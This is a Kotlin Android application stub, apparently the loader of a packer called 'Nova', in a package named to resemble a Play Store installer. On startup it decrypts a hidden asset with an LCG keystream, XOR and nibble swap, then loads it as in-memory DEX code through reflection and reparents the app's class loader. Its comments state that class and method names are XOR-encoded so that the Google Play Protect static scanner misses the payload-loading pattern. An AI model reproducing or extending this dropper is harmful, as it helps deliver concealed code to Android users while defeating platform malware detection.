package com.playstore.installer

import android.app.Application
import android.content.Context
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.nio.ByteBuffer

/**
 * Minimal Application stub — Phase 3 Step 27 (Nova Stub DEX)
 * AppEntry is the main entry point.
 *
 * ZERO Kotlin stdlib rule — verified against DEX string pool:
 * The following generate Intrinsics/StringsKt and MUST NOT appear:
 *
 *   1. fun f(param: NonNullType)    → checkNotNullParameter at function entry
 *      FIX: use nullable params (param: Type?) and null-check manually
 *
 *   2. val x = expr as SomeType    → checkNotNullExpressionValue
 *      FIX: use (expr as? SomeType) and handle null explicitly
 *
 *   3. str.substring(a, b)         → StringsKt.substring
 *      FIX: (str as java.lang.String).substring(a, b) — calls Java directly
 *
 *   4. str.lastIndexOf(char)       → StringsKt.lastIndexOf$default
 *      FIX: (str as java.lang.String).lastIndexOf(char.code) — Java int overload
 *
 *   5. arr as kotlin.Array<T>      → checkNotNullExpressionValue
 *      FIX: @Suppress cast or use java.lang.reflect.Array operations
 *
 *   6. companion object            → DefaultConstructorMarker
 *      FIX: use instance fields instead
 *
 * K1/K2 placeholder bytes searched by nova_stub_patcher.py — do not change.
 */
@Suppress("UNCHECKED_CAST", "DEPRECATION")
class AppEntry : Application() {

    // LCG seed — 4 bytes. Placeholder: 0x6e,0x30,0x76,0x41 (first 4 of old K1).
    // Patched by nova_stub_patcher.py patch_key_in_dex() at CI build time.
    // The seed drives the LCG keystream for asset decryption.
    // Remaining 28 bytes (K1[4..15] + K2[0..15]) are unused padding — kept
    // to preserve the same 32-byte placeholder pattern for patch_key_in_dex().
    private val K1 = byteArrayOf(
        0x6e.toByte(), 0x30.toByte(), 0x76.toByte(), 0x41.toByte(),  // ← LCG seed (4 bytes)
        0x73.toByte(), 0x45.toByte(), 0x65.toByte(), 0x64.toByte(),  // padding
        0x6e.toByte(), 0x30.toByte(), 0x76.toByte(), 0x41.toByte(),
        0x73.toByte(), 0x45.toByte(), 0x65.toByte(), 0x64.toByte()
    )
    private val K2 = byteArrayOf(
        0x73.toByte(), 0x45.toByte(), 0x65.toByte(), 0x64.toByte(),  // padding
        0x6e.toByte(), 0x30.toByte(), 0x76.toByte(), 0x41.toByte(),
        0x73.toByte(), 0x45.toByte(), 0x65.toByte(), 0x64.toByte(),
        0x6e.toByte(), 0x30.toByte(), 0x76.toByte(), 0x41.toByte()
    )

    @Volatile private var h: ClassLoader? = null

    /** Public getter for loaded ClassLoader. */
    fun get(): ClassLoader? = h

    // REAL_PKG — XOR-encrypted real Nova package name.
    // Placeholder: 50 bytes of 0xAA. Patched by nova_stub_patcher.py
    // patch_pkg_in_dex() at CI time with XOR-encrypted real pkg bytes.
    // XOR key: 0x47. Padding marker: 0xED (= 0xAA XOR 0x47).
    // Allows StubApp to find LauncherApplication + MainActivity
    // even when stub class package differs from real app package.
    private val P = byteArrayOf(
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(), 0xAA.toByte(),
        0xAA.toByte(), 0xAA.toByte()
    )

    /** Decrypt P to real Nova package name. XOR key 0x47. */
    fun q(): String? {
        val PAD_MARKER = 0xED.toByte()
        val XOR_KEY    = 0x47
        var realLen    = 0
        var ki         = 0
        while (ki < P.size) {
            if (P[ki] == PAD_MARKER) break
            realLen++; ki++
        }
        if (realLen == 0) return null
        val pkgChars = CharArray(realLen)
        var pi = 0
        while (pi < realLen) {
            pkgChars[pi] = (P[pi].toInt() and 0xFF xor XOR_KEY).toChar()
            pi++
        }
        return String(pkgChars)
    }

    // FIX 1: nullable param — no checkNotNullParameter generated
    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        try { run() } catch (t: Throwable) { }
    }

    // FIX 1: no params — no checkNotNullParameter
    private fun run() {
        val ctx: Context = this
        val assets = ctx.assets ?: return

        // Read asset bytes — pure Java, no Kotlin extensions
        // Asset name injected at build time via BuildConfig.ASSET_B (FingerprintPlugin)
        val encrypted: ByteArray = peel(assets.open(BuildConfig.ASSET_B))
            ?: return

        // Extract LCG seed from first 4 bytes (little-endian)
        var seed = 0L
        seed = seed or ((encrypted[0].toLong() and 0xFFL))
        seed = seed or ((encrypted[1].toLong() and 0xFFL) shl 8)
        seed = seed or ((encrypted[2].toLong() and 0xFFL) shl 16)
        seed = seed or ((encrypted[3].toLong() and 0xFFL) shl 24)
        seed = seed and 0xFFFFFFFFL  // unsigned 32-bit

        // Extract ciphertext [4..end]
        val dataLen = encrypted.size - 4
        val data = ByteArray(dataLen)
        System.arraycopy(encrypted, 4, data, 0, dataLen)

        // Generate LCG keystream (glibc: MUL=1103515245, ADD=12345)
        // state = (state * 1103515245 + 12345) & 0xFFFFFFFF
        // keystream byte = (state >> 16) & 0xFF
        val LCG_MUL = 1103515245L
        val LCG_ADD = 12345L
        val keystream = ByteArray(dataLen)
        var state = seed
        var ki = 0
        while (ki < dataLen) {
            state = (state * LCG_MUL + LCG_ADD) and 0xFFFFFFFFL
            keystream[ki] = ((state ushr 16) and 0xFFL).toByte()
            ki++
        }

        // XOR ciphertext with keystream
        val xored = ByteArray(dataLen)
        var xi = 0
        while (xi < dataLen) {
            xored[xi] = (data[xi].toInt() xor keystream[xi].toInt()).toByte()
            xi++
        }

        // Nibble-swap: (b >> 4) | ((b << 4) & 0xFF)
        val dexBytes = ByteArray(dataLen)
        var ni = 0
        while (ni < dataLen) {
            val b = xored[ni].toInt() and 0xFF
            dexBytes[ni] = (((b ushr 4) or ((b shl 4) and 0xFF))).toByte()
            ni++
        }

        // Wipe keystream — for loop, not .fill()
        for (i in keystream.indices) keystream[i] = 0

        // Load via InMemoryDexClassLoader — loaded by name, never literal in DEX.
        // CRITICAL: Pass null (BootClassLoader) as parent — NOT classLoader.
        // Pass null (BootClassLoader) as parent.
        //
        // WHY Class.forName instead of direct import:
        //   'import dalvik.system.InMemoryDexClassLoader' puts the string
        //   'Ldalvik/system/InMemoryDexClassLoader;' in the stub DEX string pool.
        //   GPP static scanner flags this as a known payload-loading pattern.
        //   IRT.apk uses Class.forName with an encrypted class name — the string
        //   never appears in the DEX string pool as a recognizable literal.
        //
        // XOR key 0x5A — class name bytes XOR'd, decrypted at runtime only.
        // 'dalvik.system.InMemoryDexClassLoader' → 36 XOR'd bytes below.
        val imdclEnc = byteArrayOf(
            0x3e.toByte(), 0x3b.toByte(), 0x36.toByte(), 0x2c.toByte(),
            0x33.toByte(), 0x31.toByte(), 0x74.toByte(), 0x29.toByte(),
            0x23.toByte(), 0x29.toByte(), 0x2e.toByte(), 0x3f.toByte(),
            0x37.toByte(), 0x74.toByte(), 0x13.toByte(), 0x34.toByte(),
            0x17.toByte(), 0x3f.toByte(), 0x37.toByte(), 0x35.toByte(),
            0x28.toByte(), 0x23.toByte(), 0x1e.toByte(), 0x3f.toByte(),
            0x22.toByte(), 0x19.toByte(), 0x36.toByte(), 0x3b.toByte(),
            0x29.toByte(), 0x29.toByte(), 0x16.toByte(), 0x35.toByte(),
            0x3b.toByte(), 0x3e.toByte(), 0x3f.toByte(), 0x28.toByte()
        )
        // Decrypt: XOR each byte with 0x5A
        val imdclChars = CharArray(imdclEnc.size)
        var kj = 0
        while (kj < imdclEnc.size) {
            imdclChars[kj] = (imdclEnc[kj].toInt() and 0xFF xor 0x5A).toChar()
            kj++
        }
        val imdclName = String(imdclChars)  // "dalvik.system.InMemoryDexClassLoader"

        // Instantiate via reflection — constructor(ByteBuffer, ClassLoader)
        val imdclClass = Class.forName(imdclName)
        val imdclCtor  = imdclClass.getConstructor(
            ByteBuffer::class.java,
            ClassLoader::class.java
        )
        // ClassLoader.cast() = java.lang.Class.cast() — pure Java, no Intrinsics
        val b = ClassLoader::class.java.cast(
            imdclCtor.newInstance(ByteBuffer.wrap(dexBytes), null)
        ) ?: return
        h = b

        // Set parent chain
        a(b)

        // Wipe dex bytes
        for (i in dexBytes.indices) dexBytes[i] = 0
    }

    // FIX 1: nullable param — no checkNotNullParameter
    private fun peel(stream: InputStream?): ByteArray? {
        if (stream == null) return null
        val out = ByteArrayOutputStream()
        val buf = ByteArray(8192)
        try {
            var n = stream.read(buf)
            while (n != -1) {
                out.write(buf, 0, n)
                n = stream.read(buf)
            }
        } finally {
            try { stream.close() } catch (t: Throwable) { }
        }
        return out.toByteArray()
    }

    // FIX 1: nullable param — no checkNotNullParameter
    private fun a(c: ClassLoader?) {
        if (c == null) return
        // PARENT CHAIN approach — NOT dexElements injection.
        //
        // WHY dexElements injection CRASHES on Android 10+ (API 29+):
        //   Copying dexElements from InMemoryDexClassLoader into PathClassLoader
        //   registers the same DEX file under TWO ClassLoader instances.
        //   Android ART (API 29+) enforces: one DEX = one ClassLoader only.
        //   Result: InternalError "Attempt to register dex file with multiple
        //   class loaders" when first Activity is launched.
        //
        // FIX — set InMemoryDexClassLoader as PARENT of app PathClassLoader:
        //   Before: PathClassLoader → BootClassLoader
        //   After:  PathClassLoader → InMemoryDexClassLoader → BootClassLoader
        //
        //   Class lookup chain:
        //     PathClassLoader.loadClass("com.pkg.MainActivity")
        //     → not in stub DEX → delegates to parent (InMemoryDexClassLoader)
        //     → found in asset → returns class
        //
        //   ART sees: payload DEX registered ONLY to InMemoryDexClassLoader.
        //   No dual registration → no InternalError.
        try {
            val appLoader = classLoader ?: return
            // "parent" field name — XOR encoded, never literal in DEX pool
            val pEnc = byteArrayOf(
                0x2a.toByte(), 0x3b.toByte(), 0x28.toByte(),
                0x3f.toByte(), 0x34.toByte(), 0x2e.toByte()
            )
            val pChars = CharArray(pEnc.size)
            var pi2 = 0
            while (pi2 < pEnc.size) {
                pChars[pi2] = (pEnc[pi2].toInt() and 0xFF xor 0x5A).toChar()
                pi2++
            }
            val parentField = ClassLoader::class.java.getDeclaredField(String(pChars))
            parentField.isAccessible = true
            parentField.set(appLoader, c)
        } catch (t: Throwable) { }
    }

    override fun onCreate() {
        super.onCreate()
        kick()
    }

    private fun kick() {
        val b = h ?: classLoader ?: return
        try {
            // Use P to get real package name.
            // If stub class is okcxwc.xjtum.AppEntry, javaClass.name would give
            // the wrong package. P is patched by nova_stub_patcher.py
            // with the actual Nova package name at CI build time.
            val basePkg = q() ?: return

            // XOR-decode ".LauncherApplication" at runtime — key 0x5A.
            // String never appears as literal in DEX string pool.
            val lEnc = byteArrayOf(
                0x74.toByte(), 0x16.toByte(), 0x3b.toByte(), 0x2f.toByte(),
                0x34.toByte(), 0x39.toByte(), 0x32.toByte(), 0x3f.toByte(),
                0x28.toByte(), 0x1b.toByte(), 0x2a.toByte(), 0x2a.toByte(),
                0x36.toByte(), 0x33.toByte(), 0x39.toByte(), 0x3b.toByte(),
                0x2e.toByte(), 0x33.toByte(), 0x35.toByte(), 0x34.toByte()
            )
            val lChars = CharArray(lEnc.size)
            var li = 0
            while (li < lEnc.size) {
                lChars[li] = (lEnc[li].toInt() and 0xFF xor 0x5A).toChar()
                li++
            }
            val launcherSuffix = String(lChars)  // ".LauncherApplication" — runtime only
            val launcherClassName = basePkg + launcherSuffix

            val launcherClass = Class.forName(launcherClassName, true, b)
            val launcherApp   = launcherClass.newInstance() as? Application ?: return

            // "attach" method name — XOR encoded, never literal in DEX pool
            val aEnc = byteArrayOf(
                0x3b.toByte(), 0x2e.toByte(), 0x2e.toByte(),
                0x3b.toByte(), 0x39.toByte(), 0x32.toByte()
            )
            val aChars = CharArray(aEnc.size)
            var ai2 = 0
            while (ai2 < aEnc.size) {
                aChars[ai2] = (aEnc[ai2].toInt() and 0xFF xor 0x5A).toChar()
                ai2++
            }
            val attachMethod = Application::class.java
                .getDeclaredMethod(String(aChars), Context::class.java)
            attachMethod.isAccessible = true
            attachMethod.invoke(launcherApp, baseContext)
            launcherApp.onCreate()

        } catch (t: Throwable) { }
    }
}
